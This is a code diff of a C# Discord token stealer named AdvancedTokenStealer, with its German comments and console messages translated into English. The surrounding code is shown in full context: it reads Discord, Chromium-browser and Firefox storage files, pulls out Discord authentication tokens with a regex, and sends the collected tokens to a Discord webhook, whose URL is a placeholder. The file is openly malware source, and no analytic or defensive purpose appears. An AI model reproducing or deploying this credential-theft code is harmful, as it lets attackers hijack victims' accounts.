@@ -7,27 +7,27 @@ using System.Configuration;
 using System.Threading.Tasks;
 using System.Linq;
 
-// THIS IS JUST A PAYLOAD
+// THIS IS JUST A PAYLOAD WITHOUT THE INTERFACE
 
 public class AdvancedTokenStealer
 {
     public static async Task RunTokenGrabber()
     {
-        string webhookUrl = "https://discord.com/api/webhooks/DEIN_WEBHOOK_HIER";
+        string webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";
         StringBuilder stolenTokens = new StringBuilder();
 
         // 1. Discord-Tokens
         stolenTokens.AppendLine("=== Discord Tokens ===");
         stolenTokens.AppendLine(GetDiscordTokens());
 
-        // 2. Browser-Tokens (erweitert für mehr Browser)
+        // 2. Browser-Tokens (more browser)
         stolenTokens.AppendLine("=== Browser Tokens ===");
         stolenTokens.AppendLine(await GetEnhancedBrowserTokens());
 
-        // Debug-Ausgabe
-        Console.WriteLine("Gesammelte Tokens:\n" + stolenTokens);
+        // Debug-Output
+        Console.WriteLine("Found Tokens:\n" + stolenTokens);
 
-        // 3. Senden, wenn Tokens vorhanden
+        // 3. Send if there is a token
         if (!string.IsNullOrWhiteSpace(stolenTokens.ToString().Replace("===", "").Trim()))
         {
             await SendToWebhook(webhookUrl, stolenTokens.ToString());
@@ -60,7 +60,7 @@ public class AdvancedTokenStealer
         {
             if (!Directory.Exists(path))
             {
-                Console.WriteLine($"[!] Discord-Pfad nicht gefunden: {path}");
+                Console.WriteLine($"[!] Discord-path not found: {path}");
                 continue;
             }
 
@@ -75,14 +75,14 @@ public class AdvancedTokenStealer
                     {
                         if (!tokens.ToString().Contains(match.Value))
                         {
-                            Console.WriteLine($"[+] Discord-Token gefunden ({Path.GetFileName(file)}): {match.Value}");
+                            Console.WriteLine($"[+] Discord-Token found ({Path.GetFileName(file)}): {match.Value}");
                             tokens.AppendLine(match.Value);
                         }
                     }
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine($"[!] Fehler beim Lesen {Path.GetFileName(file)}: {ex.Message}");
+                    Console.WriteLine($"[!] read error {Path.GetFileName(file)}: {ex.Message}");
                 }
             }
         }
@@ -140,14 +140,14 @@ public class AdvancedTokenStealer
                 {
                     if (!tokens.ToString().Contains(match.Value))
                     {
-                        Console.WriteLine($"[+] Browser-Token gefunden ({Path.GetFileName(file)}): {match.Value}");
+                        Console.WriteLine($"[+] Browser-Token found ({Path.GetFileName(file)}): {match.Value}");
                         tokens.AppendLine(match.Value);
                     }
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"[!] Fehler beim Lesen {Path.GetFileName(file)}: {ex.Message}");
+                Console.WriteLine($"[!] read error {Path.GetFileName(file)}: {ex.Message}");
             }
         }
 
@@ -168,7 +168,7 @@ public class AdvancedTokenStealer
             {
                 try
                 {
-                    // Vereinfachte Firefox-Token-Extraktion (SQLite benötigt System.Data.SQLite)
+                    // (SQLite needs System.Data.SQLite)
                     string content = File.ReadAllText(cookiesPath);
                     var matches = Regex.Matches(content, @"(mfa\.[\w-]{84}|[\w-]{24,30}\.[\w-]{6}\.[\w-]{27,40})");
 
@@ -176,7 +176,7 @@ public class AdvancedTokenStealer
                     {
                         if (!tokens.ToString().Contains(match.Value))
                         {
-                            Console.WriteLine($"[+] Firefox-Token gefunden: {match.Value}");
+                            Console.WriteLine($"[+] Firefox-Token found: {match.Value}");
                             tokens.AppendLine(match.Value);
                         }
                     }
